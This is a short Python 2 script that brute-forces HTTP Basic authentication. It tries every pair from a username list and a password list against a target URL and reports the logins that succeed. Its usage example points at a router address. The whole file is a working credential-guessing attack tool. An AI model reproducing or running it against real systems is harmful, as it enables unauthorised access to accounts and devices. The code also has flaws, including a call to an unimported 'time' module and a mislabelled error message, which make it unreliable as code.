import sys
import re
import urllib2
import httplib
import socket
import HTMLParser
import socket
import base64
import os
from sys import stdout
from threading import Thread
from time import sleep


def usage():
        print('\n\t:: [PH] Index Python HTTP Auth Scanner ::')
        print('\t      http://asianzines.blogspot.com')
        print('Usage:')
        print('python pybasichttpscan.py [URL] [userdict.txt] [passdict.txt]')
        print('\nExample: $ python pybasichttpscan.py http://192.168.1.1 user.txt pass.txt\n')
        return

def basic_auth(host, username, passwd):
    try:
        request = urllib2.Request(host)
        base64string = base64.encodestring('%s:%s' % (username, passwd))[:-1]
        request.add_header("Authorization", "Basic %s" % base64string)   
        result = urllib2.urlopen(request)
        stdout.write('\033[K')
        print 'Found %s:%s\n' %(username, passwd)
    except: pass
    #except (socket.gaierror, socket.error, IOError) as e: pass

def scan(host, usernames, passwords):
	try:
	  for username in usernames:
	    for pwd in passwords:
	      t = Thread(target=basic_auth, args=(host,username,pwd,))
	      t.start()
	      t.join()
	      print 'Trying %s:%s                  ' % (username, pwd)
	      stdout.write('\033[F')
	      stdout.flush()
	      while(t.isAlive()):
	        time.sleep(0xa)
	except (KeyboardInterrupt, SystemExit):
          raise
  

def main():
   if len(sys.argv) == 4:
      m_host  = str(sys.argv[1])
      userfile = sys.argv[2]
      passfile = sys.argv[-1]

      print '\n###### Started scanning \'%s\' ######\n' % (m_host)

      usernames = []
      passwords = []
      results = None

      if not os.path.isfile(userfile):
        print 'user file not found in \'%s\' on current directory' %(userfile)
        exit()
      if not os.path.isfile(passfile):
        print 'pass file not found in \'%s\' on current directory' %(userfile)
        exit()
      try:
        with open(userfile, 'r') as f: 
          for line in f:
            line = line.strip()
            usernames.append(line)
      except IOError: 
        print 'Error reading users.txt, Please check file if readable/corrupt.'
        exit()

      try:
        with open(passfile, 'r') as f: 
          for line in f:
            line = line.strip()
            passwords.append(line)
      except IOError: 
        print 'Error reading pass.txt, Please check file if readable/corrupt.'
        exit()
      
      if len(usernames) == 0:
        print 'No content(s). Please check users.txt file'
        exit()
      if len(passwords) == 0:
        print 'No content(s). Please check pass.txt file'
        exit()

      thread = Thread(target=scan, args=(m_host,usernames,passwords,))
      thread.start()
      thread.join()
      while(thread.isAlive()):
         sleep(0xA)

      stdout.write('\033[K')
      print '\n############### GAME OVER ###############\n\n'
   else:
     usage()

if __name__ == '__main__':
  main()
